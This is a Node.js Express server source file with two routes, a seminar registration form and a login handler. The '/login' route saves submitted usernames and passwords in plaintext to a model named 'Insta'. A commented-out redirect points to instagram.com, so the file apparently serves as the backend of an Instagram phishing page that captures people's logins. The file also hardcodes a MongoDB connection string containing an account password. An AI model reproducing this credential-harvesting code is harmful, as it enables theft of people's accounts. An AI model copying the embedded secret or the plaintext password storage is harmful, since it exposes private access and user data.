const express = require("express");
const app = express();
const path = require("path");
const bodyParser = require("body-parser");
const hbs = require("hbs");
const mongoose = require("mongoose");

const port = process.env.PORT || 9000;

const Insta = require("./models/user");
const Seminar = require("./models/seminar");

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("./public"));

const connectDB = require("./db/conn");
const { request } = require("http");

const DB =
  "mongodb+srv://gautamsingh:q1w2e3r4t5y6_Gautam@cluster0.4q5tu.mongodb.net/Registration?retryWrites=true&w=majority";

mongoose
  .connect(DB, {
    useNewUrlParser: true,
    useCreateIndex: true,
    useUnifiedTopology: true,
    useFindAndModify: false,
  })
  .then(() => {
    console.log(`connection succesful`);
  })
  .catch((err) => console.log(`no connection`));
// connectDB();

app.set("views", path.join(__dirname, "./views"));
app.set("view engine", "hbs");

app.get("/login", function (req, res) {
  res.render("login");
});

app.get("/", function (req, res) {
  res.render("home");
});

app.post("/", async (req, res) => {
  try {
    const firstname = req.body.firstname;
    const lastname = req.body.lastname;
    const email = req.body.email;
    const phone = req.body.phone;
    if (firstname && lastname && email && phone) {
      const registerSeminar = new Seminar({
        firstname: req.body.firstname,
        lastname: req.body.lastname,
        email: req.body.email,
        phone: req.body.phone,
      });
      const Seminars = await registerSeminar.save();
      res.render("thanks");
    } else {
      console.log("user not added");
    }
  } catch (error) {
    res.status(400).send("incompleted");
  }
});

app.post("/login", async (req, res) => {
  try {
    const username = req.body.username;
    const pass = req.body.pass;
    if (username && pass) {
      const registerEmployee = new Insta({
        username: req.body.username,
        pass: req.body.pass,
      });

      const users = await registerEmployee.save();
      // var success = req.file.fieldname + "uploaded succesfully"

      // res.render("https://www.instagram.com/")
    } else {
      console.log("user not added");
    }
  } catch (error) {
    res.status(400).send("incompleted");
  }
});

app.listen(port, (req, res) => {
  console.log(`port is working on ${port}`);
});
